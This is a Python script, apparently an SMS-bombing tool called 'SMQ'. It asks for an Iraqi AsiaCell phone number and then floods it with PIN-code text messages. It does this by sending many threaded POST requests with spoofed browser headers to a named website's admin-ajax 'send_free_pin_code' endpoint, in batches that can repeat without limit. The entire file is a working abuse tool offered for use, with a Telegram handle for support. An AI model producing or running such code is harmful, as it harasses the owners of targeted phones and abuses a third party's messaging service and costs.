#thx mom!
import os
import sys
import time
import threading
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

CYAN = "\033[1;36m"
GREEN = "\033[1;32m"
DARK_RED = "\033[0;31m"
MAGENTA = "\033[1;35m"
YELLOW = "\033[1;33m"
RED = "\033[1;31m"
MAUVE = "\033[38;5;141m"
RESET = "\033[0m"

acsrt = r"""
 ________  _____ ______   ________      
|\   ____\|\   _ \  _   \|\   __  \     
\ \  \___|\ \  \\\__\ \  \ \  \|\  \    
 \ \_____  \ \  \\|__| \  \ \  \\\  \   
  \|____|\  \ \  \    \ \  \ \  \\\  \  
    ____\_\  \ \__\    \ \__\ \_____  \ 
   |\_________\|__|     \|__|\|___| \__\
   \|_________|                    \|__|
"""

TARGET_URL = "https://pashacards.net/wp-admin/admin-ajax.php"
REQUEST_TIMEOUT = 10

ASIA_HEADERS = {
  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36",
  'Accept-Encoding': "gzip, deflate, br, zstd",
  'sec-ch-ua-platform': "\"Android\"",
  'x-requested-with': "XMLHttpRequest",
  'sec-ch-ua': "\"Chromium\";v=\"140\", \"Not=A?Brand\";v=\"24\", \"Google Chrome\";v=\"140\"",
  'sec-ch-ua-mobile': "?1",
  'origin': "https://pashacards.net",
  'sec-fetch-site': "same-origin",
  'sec-fetch-mode': "cors",
  'sec-fetch-dest': "empty",
  'referer': "https://pashacards.net/my-account/",
  'accept-language': "ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7",
  'priority': "u=1, i",
}

def clear():
    try:
        sys.stdout.write("\033[3J\033[H\033[2J")
        sys.stdout.flush()
    except Exception:
        pass
    os.system("cls" if os.name == "nt" else "clear")

def send_batch_requests(msisdn, batch_size):
    def _single(ms):
        try:
            payload = {
                'action': "send_free_pin_code",
                'msisdn': ms,
                'appId': "3",
                'countryId': "2"
            }
            r = requests.post(TARGET_URL, data=payload, headers=ASIA_HEADERS, timeout=REQUEST_TIMEOUT)
            return True
        except Exception:
            return False
    results = []
    with ThreadPoolExecutor(max_workers=batch_size) as ex:
        futures = [ex.submit(_single, msisdn) for _ in range(batch_size)]
        for fut in as_completed(futures):
            results.append(fut.result())
    return results

def validate_number(raw):
    s = raw.strip()
    if s.startswith("+964"):
        return False, "Write the number without +964, e.g 77********"
    if s.startswith("0"):
        return False, "Send the number in format 77******** without leading 0"
    if not s.isdigit() or len(s) != 10:
        return False, "Number must be 10 digits, e.g 7706425219"
    if not s.startswith("77"):
        return False, "Only Iraqi AsiaCell numbers starting with 77 are allowed"
    return True, s

def run_cycles(msisdn, batch_size, interval_seconds, stop_event, max_cycles):
    cycle = 0
    lock = threading.Lock()
    while not stop_event.is_set():
        cycle += 1
        if max_cycles and cycle > max_cycles:
            break
        clear()
        print(DARK_RED + "[ CTRL + C to Exit ]" + RESET)
        print()
        print(YELLOW + f"~~ Cycle [{cycle}] ~~" + RESET)
        print()
        time.sleep(0.12)
        print()
        for i in range(1, batch_size + 1):
            if stop_event.is_set():
                break
            with lock:
                sys.stdout.write("\r" + GREEN + f"{i}/{batch_size}" + RESET + "    ")
                sys.stdout.flush()
            print()
            time.sleep(0.15)
        print()
        time.sleep(0.6)
        send_batch_requests(msisdn, batch_size)
        time.sleep(interval_seconds)
    clear()

def typing_print(text, color=DARK_RED, char_delay=0.06):
    sys.stdout.write(color)
    sys.stdout.flush()
    for ch in text:
        sys.stdout.write(ch)
        sys.stdout.flush()
        time.sleep(char_delay)
    sys.stdout.write(RESET + "\n")
    sys.stdout.flush()

def smqz():
    while True:
        clear()
        time.sleep(1.9)
        print(MAGENTA + acsrt + RESET)
        print()
        time.sleep(0.12)
        typing_print(YELLOW + f"If u had a {DARK_RED}Problem{YELLOW} , Text Me on Telegram : {GREEN}@binst" + RESET)
        print()
        time.sleep(0.12)
        print(DARK_RED + "[00] ~ Exit" + RESET)
        print()
        time.sleep(0.12)
        while True:
            print(CYAN + f"Enter phone number {DARK_RED}(Only AsiaCell Iraq !) {CYAN}: " + RESET, end="")
            raw = input().strip()
            print()
            if raw == "00":
                clear()
                sys.exit(0)
            ok, resp = validate_number(raw)
            if not ok:
                print(DARK_RED + resp + RESET)
                print()
                time.sleep(0.6)
                continue
            msisdn = resp
            break
        print(CYAN + "Enter number of messages per batch : " + RESET, end="")
        try:
            batch_size = int(input().strip())
        except:
            batch_size = 10
        print()
        time.sleep(0.12)
        print(CYAN + "Enter seconds between batches : " + RESET, end="")
        try:
            interval_seconds = float(input().strip())
        except:
            interval_seconds = 3.0
        print()
        time.sleep(0)
        print(CYAN + "Enter number of cycles (0 for infinite) : " + RESET, end="")
        try:
            cycles = int(input().strip())
        except:
            cycles = 0
        print()
        time.sleep(0)
        clear()
        stop_event = threading.Event()
        worker = threading.Thread(target=run_cycles, args=(msisdn, batch_size, interval_seconds, stop_event, cycles), daemon=True)
        worker.start()
        try:
            while worker.is_alive():
                time.sleep(0.2)
        except KeyboardInterrupt:
            stop_event.set()
            worker.join()
        print(YELLOW + f"The Cycles Is {GREEN}Done" + RESET)
        print()
        print(DARK_RED + "[11] ~~ Restart" + RESET)
        print()
        print(DARK_RED + "[00] ~~ Exit" + RESET)
        print()
        choice = input(": ").strip()
        print()
        if choice == "11":
            continue
        elif choice == "00":
            clear()
            sys.exit(0)
        else:
            clear()
            print(DARK_RED + "Inviled Choice !")
            print()
            time.sleep(2.8)
            print(DARK_RED + "SMQ Will Be Closed ..." + RESET)
            time.sleep(3.5)
            clear()
            sys.exit(0)

if __name__ == "__main__":
    smqz()
